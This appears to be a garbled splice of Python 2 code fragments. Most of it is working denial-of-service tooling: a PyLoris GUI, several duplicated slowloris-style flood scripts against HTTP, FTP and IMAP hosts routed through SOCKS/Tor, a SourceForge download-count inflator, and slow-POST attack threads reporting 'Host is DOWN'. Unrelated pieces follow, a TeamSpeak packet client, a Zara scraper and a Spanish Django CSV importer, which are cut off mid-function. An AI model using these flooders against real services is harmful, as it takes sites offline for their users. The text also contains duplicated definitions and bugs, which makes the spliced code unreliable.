        Entry(gf, textvariable = self.options['host']).grid(row = 0, column = 2, columnspan = 2)
        Label(gf, text = 'Port:').grid(row = 1, column = 1)
        Entry(gf, textvariable = self.options['port']).grid(row = 1, column = 2, columnspan = 2)
        Checkbutton(gf, text = 'SSL', variable = self.options['ssl']).grid(row = 2, column = 1)

        bf = LabelFrame(self, text = 'Behavior', relief = GROOVE, labelanchor = 'nw', width = 400, height = 170)
        bf.grid(row = 1, column = 1)
        bf.grid_propagate(0)
        Label(bf, text = 'Attack Limit (0 = No limit):').grid(row = 0, column = 1)
        Entry(bf, textvariable = self.options['attacklimit']).grid(row = 0, column = 2)
        Label(bf, text = 'Connection Limit (0 = No limit):').grid(row = 1, column = 1)
        Entry(bf, textvariable = self.options['connectionlimit']).grid(row = 1, column = 2)
        Label(bf, text = 'Thread Limit (0 = No limit):').grid(row = 2, column = 1)
        Entry(bf, textvariable = self.options['threadlimit']).grid(row = 2, column = 2)
        Label(bf, text = 'Connection speed (bytes/sec):').grid(row = 3, column = 1)
        Entry(bf, textvariable = self.options['connectionspeed']).grid(row = 3, column = 2)
        Label(bf, text = 'Time between thread spawns (seconds):').grid(row = 4, column = 1)
        Entry(bf, textvariable = self.options['timebetweenthreads']).grid(row = 4, column = 2)
        Label(bf, text = 'Time between connections (seconds):').grid(row = 5, column = 1)
        Entry(bf, textvariable = self.options['timebetweenconnections']).grid(row = 5, column = 2)
        Checkbutton(bf, text = 'Close finished connections', variable = self.options['quitimmediately']).grid(row = 6, column = 1, columnspan = 2)

        pf = LabelFrame(self, text = 'Proxy', relief = GROOVE, labelanchor = 'nw', width = 400, height = 130)
        pf.grid(row = 2, column = 1)
        pf.grid_propagate(0)
        Label(pf, text = 'Proxy type (SOCKS4/SOCKS5/HTTP/NONE)').grid(row = 0, column = 1)
        Entry(pf, textvariable = self.options['socksversion']).grid(row = 0, column = 2)
        Label(pf, text = 'Proxy Hostname / IP Address').grid(row = 1, column = 1)
        Entry(pf, textvariable = self.options['sockshost']).grid(row = 1, column = 2)
        Label(pf, text = 'Proxy Port').grid(row = 2, column = 1)
        Entry(pf, textvariable = self.options['socksport']).grid(row = 2, column = 2)
        Label(pf, text = 'Proxy Username').grid(row = 3, column = 1)
        Entry(pf, textvariable = self.options['socksuser']).grid(row = 3, column = 2)
        Label(pf, text = 'Proxy Password').grid(row = 4, column = 1)
        Entry(pf, textvariable = self.options['sockspass']).grid(row = 4, column = 2)

        Button(self, text = "Launch", command = self.launch).grid(row = 3, column = 1)

        df = LabelFrame(self, text = 'Request Body', relief = GROOVE, labelanchor = 'nw')
        df.grid(row = 0, column = 2, rowspan = 4)
        self.options['request'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=NONE, height = 28, width = 80)
        self.options['request'].grid(row = 0, column = 1)
        self.options['request'].insert(END, 'GET / HTTP/1.1\r\nHost: www.example.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.demonstration.com/\r\n')
        self.options['request'].insert(END, 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n')
        self.options['request'].insert(END, 'Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n')


    def launch(self):
        lorisoptions = DefaultOptions()
        for key in self.options.keys():
            if key == 'request': lorisoptions[key] = self.options[key].get('1.0', END)
            elif key == 'quitimmediately' or key == 'ssl':
                if self.options[key].get() == 0:
                    lorisoptions[key] = False
                else: lorisoptions[key] = self.options[key].get()
            else: lorisoptions[key] = self.options[key].get()

        self.lws.append(LorisWindow('%s:%i' % (lorisoptions['host'], lorisoptions['port']), lorisoptions))

    def checkloop(self):
        thread.start_new_thread(self.check, ())

    def check(self):
        while True:
            for lw in self.lws:
                lw.check()
            time.sleep(1)

class LorisWindow(Toplevel):
    def __init__(self, title, options):
        Toplevel.__init__(self)
        self.title(string = title)
        self.loris = Loris()
        self.loris.LoadOptions(options)
        self.elements = {'attacks' : StringVar(), 'threads' : StringVar(), 'sockets' : StringVar()}
        self.loris.start()

        sf = LabelFrame(self, text = 'Status', width = 180, height = 138)
        sf.grid(row = 0, column = 1)
        sf.grid_propagate(0)
        Label(sf, text = 'Target: %s:%i' % (options['host'], options['port'])).grid(row = 0, column = 1)
        Label(sf, text = 'Attacks: 0', textvar = self.elements['attacks']).grid(row = 1, column = 1)
        Label(sf, text = 'Threads: 0', textvar = self.elements['threads']).grid(row = 2, column = 1)
        Label(sf, text = 'Sockets: 0', textvar = self.elements['sockets']).grid(row = 3, column = 1)
        Button(sf, text = 'Stop Attack', command = self.loris.stop).grid(row = 4, column = 1)

        df = LabelFrame(self, text = 'Log')
        df.grid(row = 0, column = 2)
        self.elements['logs'] = Text(df, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 80)
        self.elements['logs'].grid(row = 0, column = 1)

    def check(self):
        status = self.loris.status()
        self.elements['attacks'].set('Attacks: %i' % (status[0]))
        self.elements['threads'].set('Threads: %i' % (status[1]))
        self.elements['sockets'].set('Sockets: %i' % (status[2]))

        try:
            while True:
                message = self.loris.messages.get(False)
                self.elements['logs'].insert(END, '%s\n' % message)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                debug = self.loris.debug.get(False)
                self.elements['logs'].insert(END, '%s\n' % debug)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass

        try:
            while True:
                error = self.loris.errors.get(False)
                self.elements['logs'].insert(END, '[ERROR]: %s\n' % error)
                self.elements['logs'].yview_moveto(1.0)
        except:
            pass
            
def main(host, port, filename):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET %s HTTP/1.1\r\n' % (host)
    loris.options['request'] += 'Host: %s\r\n' % (filename)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_deflate.py) (http://pyloris.sf.net/)\r\n'
    loris.options['request'] = 'Accept-Encoding: gzip\r\n\r\n'

    loris.options['attacklimit'] = 0
    loris.options['connectionlimit'] = 8
    loris.options['threadlimit'] = 2
    loris.options['timebetweenthreads'] = 0
    loris.options['timebetweenconnections'] = 1
    loris.options['quitimmediately'] = True

    loris.mainloop()
    
def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'USER anonymous\r\n'
    loris.options['request'] += 'PASS anonymous@domain.com\r\n'
    loris.options['request'] += 'A' * (1024 * 1042)

    loris.options['threadlimit'] = 16
    loris.options['connectionlimit'] = 0
    loris.options['timebetweenconnections'] = 0.01

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()
    
def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'

    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()
    
def main(host, port):
    # Instantiate the ScriptLoris object
    loris = ScriptLoris()

    # Set the connection  options
    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Build the HTTP request body
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'
    loris.options['request'] += 'A' * 1024 * 1024

    # Launch the attack
    loris.mainloop()
    
def main(host, port):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['ssl'] = True

    loris.options['threadlimit'] = 64
    loris.options['connectionlimit'] = 4092
    loris.options['connectionspeed'] = 1

    loris.options['request'] = ''
    for i in range(1000):
        loris.options['request'] += 'a%02i CAPABILITY\n' % (i)

    loris.mainloop()
    
def main(projectname, downloadrefer, downloadmirror, downloadhost1, downloadhost2, downloadfile,
        downloadevery, headevery, pagehitevery, logohitevery, useragent, sockshost, socksport):
    options = DefaultOptions()
    options['referer'] = '%s.sourceforge.net/projects/%s/files/%s/download' % (projectname, projectname, downloadfile)
    options['host'] = downloadhost1
    options['port'] = 80
    options['connectionspeed'] = 0
    options['timebetweenconnections'] = downloadevery
    options['threadlimit'] = 1
    options['connectionlimit'] = 1
    options['socksversion'] = 'SOCKS5'
    options['sockshost'] = sockshost
    options['socksport'] = socksport
    options['request'] = 'GET %s?use_mirror=%s HTTP/1.1\r\n' %(downloadfile, downloadmirror)
    options['request'] += 'Host: %s\r\n' % (downloadhost1)
    options['request'] += 'Referer: %s\r\n' % (downloadrefer)
    options['request'] += 'User-Agent: %s\r\n\r\n' %(useragent)

    loris1 = ScriptLoris()
    loris1.LoadOptions(options)
    loris1.start()

    options['host'] = downloadhost2
    options['request'] = 'GET %s HTTP/1.1\r\n' % (downloadfile)
    options['request'] += 'Host: %s\r\n' % (downloadhost2)
    options['request'] += 'Referer: %s\r\n' % (downloadrefer)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)

    loris2 = ScriptLoris()
    loris2.LoadOptions(options)
    loris2.start()

    options['host'] = '%s.sourceforge.net' % (projectname)
    options['request'] = 'HEAD / HTTP/1.1\r\n'
    options['request'] += 'Host: %s.sourceforge.net\r\n' % (projectname)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = headevery

    loris3 = ScriptLoris()
    loris3.LoadOptions(options)
    loris3.start()

    options['request'] = 'GET / HTTP/1.1\r\n'
    options['request'] += 'Host: %s.sourceforge.net\r\n' % (projectname)
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = pagehitevery

    loris4 = ScriptLoris()
    loris4.LoadOptions(options)
    loris4.start()

    options['host'] = 'sflogo.sourceforge.net'
    options['request'] = 'GET /sflogo.php?group_id=266347&type=12 HTTP/1.1\r\n'
    options['request'] += 'Host: %sflogo.sourceforge.net\r\n'
    options['request'] += 'User-Agent: %s\r\n\r\n' % (useragent)
    options['timebetweenconnections'] = logohitevery

    loris5 = ScriptLoris()
    loris5.LoadOptions(options)
    loris5.start()

class PyGroupTalk:
 
    def __init__(self,port=8767,
    host="74.50.98.2",
    nickName="Ethoxyethaan5",
    client="TeamSpeak",
    loginName=None,
    operatingSystem="Windows XP",
    autoNick=True,
    anonymous=True,
    password=None):
        self.port           =port
        self.host           =host
        self.nickName       =nickName
        self.loginName      =loginName
        self.operatingSystem=operatingSystem
        self.autoNick       =autoNick
        self.anonymous      =anonymous
        self.password       =password
        self.client         =client
 
        self.__nick    = self.__FormatText(29,self.nickName)
        self.__login   = self.__FormatText(29,self.loginName)
        self.__password= self.__FormatText(29,self.password)
        self.__client  = self.__FormatText(29,self.client)
        self.__OS      = self.__FormatText(29,self.operatingSystem)
        self.__autonNick = "\x01" if self.autoNick else "\x00"
        self.__registered_login = "\x01" if self.anonymous else "\x02"
 
        self.__s_packet = ""
        self.__get=""
       
        self.__socket = None
 
        self.__client_id = "\0"*4
        self.__session_key = "\x00\x00\x00\x00"
        self.__sequence_number = "\x01\x00\x00\x00"
 
        self.__crc_offset=int(0)
 
        self.__resend="\x00\x00"
        self.__ping_sequ="\x02\x00\x00\x00"
 
        self.lasterror=time.time()
 
    def __FormatText(self,s,n):
        return (chr(len(n))+n+((s-len(n))*"\0")) if n <> None else 30*"\0"
        #value_when_true if condition else value_when_false
 
    def __Format_Left(self,lengt,string):
        ""
 
    def __CrcMirror(self,A):
        A=A&0xFFFFFFFF
        A = (A>>(8*3))+((A&0x00FF0000)>>8)+((A&0x0000FF00)<<8)+((A&0x000000FF)<<(8*3))
        return A
 
    def __CrcMirrorChar(self,A):
        A=self.__CrcMirror(A)
        A=chr(A>>8*3)+chr((A&0x00FF0000)>>8*2)+chr((A&0x0000FF00)>>8)+chr((A&0x000000FF))
        return A
 
    #responce creation
 
    def __Set_Class_Connection(self):
        self.__s_packet = "\xf4\xbe"
 
    def __Set_Class_Standard(self):
        self.__s_packet="\xf0\xbe"
 
    def __Set_Class_Ack(self):
        self.__s_packet="\xf1\xbe"
 
    def __Set_Type_Login_Request(self):
        self.__s_packet=self.__s_packet + "\x03\x00"
 
    def __Set_Type_Login_Request_Part_2(self):
        self.__s_packet=self.__s_packet + "\x05\x00"
 
    def __Set_Type_Ping(self):
        self.__s_packet=self.__s_packet+"\x01\0"
 
    def __Set_Client_Id(self):
        self.__s_packet=self.__s_packet+self.__client_id
 
    def __Set_Sequence_Number(self):
        self.__s_packet=self.__s_packet+self.__sequence_number
 
    def __Set_Ping_Sequence_number(self):
        self.__s_packet=self.__s_packet+self.__ping_sequ
 
    def __Set_Session_Key(self):
        self.__s_packet=self.__s_packet+self.__session_key
 
    def __Set_Host(self):
        a=chr(int(self.host.split(".")[0]))
        b=chr(int(self.host.split(".")[1]))
        c=chr(int(self.host.split(".")[2]))
        d=chr(int(self.host.split(".")[3]))
        #print (a+b+c+d).encode("hex")
        self.__s_packet=self.__s_packet+a+b+c+d
 
    def __Set_Port(self):
        self.__s_packet=self.__s_packet+(chr(int(self.port/0x100))+chr(int(self.port-int(self.port/0x100)*0x100)))
       
    def __Set_Crc_Empty(self):
        self.__crc_offset=len(self.__s_packet)
        self.__s_packet=self.__s_packet+"\0"*4
 
    def __Set_Crc_Packet(self):
        self.__s_packet=self.__s_packet[:self.__crc_offset]+self.__CrcMirrorChar(crc32(self.__s_packet))+self.__s_packet[self.__crc_offset+4:]
    #end responce creatio
 
    def Type_1_connect_login(self):
    #packet is 180 bytes big
        self.__s_packet=""                              #empty it
        self.__client_id = "\0"*4                         #reset it
        self.__session_key = "\x00\x00\x00\x00"         #reset it
        self.__sequence_number = "\x01\x00\x00\x00"     #reset it
 
        unknown_data="\x02\0\0\0\x20\0\x3c\0"
 
        self.__Set_Class_Connection()   #2 bytes
        self.__Set_Type_Login_Request() #2 bytes
        self.__Set_Client_Id()          #4 bytes.
        self.__Set_Session_Key()        #4 bytes
        self.__Set_Sequence_Number()    #4 bytes
        self.__Set_Crc_Empty()           #4 bytes
        self.__s_packet=self.__s_packet+self.__client
        self.__s_packet=self.__s_packet+self.__OS
        self.__s_packet=self.__s_packet+unknown_data
        self.__s_packet=self.__s_packet+self.__autonNick
        self.__s_packet=self.__s_packet+self.__registered_login
        self.__s_packet=self.__s_packet+self.__login
        self.__s_packet=self.__s_packet+self.__password
        self.__s_packet=self.__s_packet+self.__nick
        self.__Set_Crc_Packet()
        self.__Create_connection()
        self.__Send()
 
        #print len(self.__s_packet)
        #print self.__s_packet.encode("hex")
    def __Type_2_connect_login(self):
        self.__s_packet="" #empty
        self.__Set_Class_Standard()               #2 bytes
        self.__Set_Type_Login_Request_Part_2()      #2 bytes
 
        self.__session_key=self.__get[172:(172+4)]  #4 bytes
        self.__client_id = self.__get[8:(8+4)]      #4 bytes
 
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__s_packet=self.__s_packet+"\x01\0\0\0"#4 bytes #sequence number
        self.__s_packet=self.__s_packet+"\0\0"      #2 bytes #resend count:0
        self.__s_packet=self.__s_packet+"\0\0"      #2 bytes #fragment number: 0
        self. __Set_Crc_Empty()
        self.__s_packet=self.__s_packet+"\x01\0"    #2 bytes #unknown number
        self.__s_packet=self.__s_packet+"\0"                        #1 bytes #Channel
        self.__s_packet=self.__s_packet+"\0"                        #1 bytes #sub_channel
        self.__Set_Host()
        self.__s_packet=self.__s_packet+"\x02\x00"
        self.__Set_Port()
        self.__Set_Host()
        self.__s_packet=self.__s_packet+"\0"*32+"\0"*32+"\0"*16
        self.__Set_Crc_Packet()
        self.__Send()
 
    def __Type_Ack(self):
        self.__s_packet=""
        self.__Set_Class_Ack()
        self.__s_packet=self.__s_packet+self.__resend
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__s_packet=self.__s_packet+self.__get[12:16]
        print "ACK ACK ACK"
        self.__Send()
 
    def __Type_Ping(self):
        self.__s_packet=""
        self.__Set_Class_Connection()
        self.__Set_Type_Ping()
        self.__Set_Session_Key()
        self.__Set_Client_Id()
        self.__Set_Ping_Sequence_number()
        self.__Set_Crc_Empty()
        self.__Set_Crc_Packet()
        #
        time.sleep(0.5)
        #
        self.__Send()
        #print "PING PING PING"
        return
 
    def testing(self):
        #self.__CrcMirror(0x12345678)
        #print self.__CrcMirrorChar(0x12345678).encode("hex")
        """
           for i in [self.__login,self.__nick,self.__password,
           self.__client,self.__OS]:
               print "#####"
               print (i).encode("hex")
               print i.replace("\0","")
               print len(i)"""
 
    def __Create_connection(self):
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.__socket.settimeout(1)
       
    def __Send(self):
        try:
            self.__socket.sendto(self.__s_packet,(self.host,self.port))
 
        except socket.error:
            print "error while sending, retrying"
            for i in range(1,5):
                try:
                    self.__socket.sendto(self.__s_packet,(self.host,self.port))
                except socket.error:
                    pass
                finally:
                    return
 
    def __Read(self):
        return self.__socket.recv(5000)
 
    def Init(self):
        try:
            error=0
            self.__get=self.__Read()
            #print "lenght:",len(self.__get)
            #
            if len(self.__get)==0:
                print "len is zero"
                error=1
                raise socket.error
        except socket.error:
            if (time.time()-self.lasterror)<5:
                print "!# Terminal socket error"
                error=1
            else:
                print "!# socket error, retrying "
                self.__get=self.__Read()
                error=0
                self.lasterror=time.time()
                #FIXME: HELP HELP HELP, INF LOOP
        finally:
            self.__Find_Reply()
            return True if error ==0 else False
 
    def __Find_Reply(self):
        header1=self.__get[:2]
        header2=self.__get[2:4]
        if header1 == "\xf4\xbe":
            if header2 == "\x04\x00":
                print "!# Login reply found"
                self.__Type_2_connect_login()
            elif header2 == "\x02\x00":
                print "!# PING found!"
                self.__ping_sequ=self.__get[12:16]
                self.__Type_Ping()
            else:
                pass
 
        elif header1 == "\xf1\xbe":
            print "!# ACK found!"
            #self.__Type_Ack()
            pass
 
        elif header1 == "\xf0\xbe":
            if header2 == "\x08\x00":
                self.__resend=self.__get[16:18]
                self.__Type_Ack()
                self.__resend="\x00\x00"
                self.__Type_Ping()
            elif self.__get[16:18] <> "\0\0":
                self.__resend=self.__get[16:18]
                self.__Type_Ack()
                self.__resend="\x00\x00"
            else:
                self.__Type_Ack()
        else:
            self.__Type_Ack()

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_post(self, pause=10):
        global stop_now
 
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue
       
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
                
				
class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
               
    def _send_http_post(self, pause=10):
        global stop_now
 
        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                        (self.host, random.choice(useragents)))
 
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
       
        self.socks.close()
               
    def run1(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:    
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"DoS Succeded - Host is DOWN!"+ term.NORMAL
                    continue
       
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        self.socks = socks.socksocket()
                        break
                    pass	
							
def randomIp():
    random.seed()
    result = str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    result = result + str(random.randint(10000, 700000)) + '.' + str(random.randint(10000, 700000))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(800, 10000)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
	
def randomUserAgent():
	return random.choice(userAgents)
 
def randomReFerer():
    return random.choice(reFerers)	

def randomKeyWord():
    return random.choice(keyWords) 	
	
def randomuseragents_list():
    return random.choice(useragents)
	
def randomrefer_list():
    return random.choice(referer)
	
def randomkeyword_list():
    return random.choice(keyword)
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(20, 80)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
	
class attacco(threading.Thread):
    def run(self):
        current = x	
def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})

def data_exist_eerr(request, pk):
    consulta = EERR.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_pp_vs_zn(request, pk):
    consulta = PrecioPromedio.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_precio_desc(request, pk):
    consulta = Descuento.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_unit(request, pk):
    consulta = Gasto.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_formula_ingreso(request, pk):
    consulta = VentaCompleta.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def transformarKilos(kilos):
    return kilos.replace('KG', '').replace('.', '').replace(',', '.')

def transformarKilosSinKG(kilos):
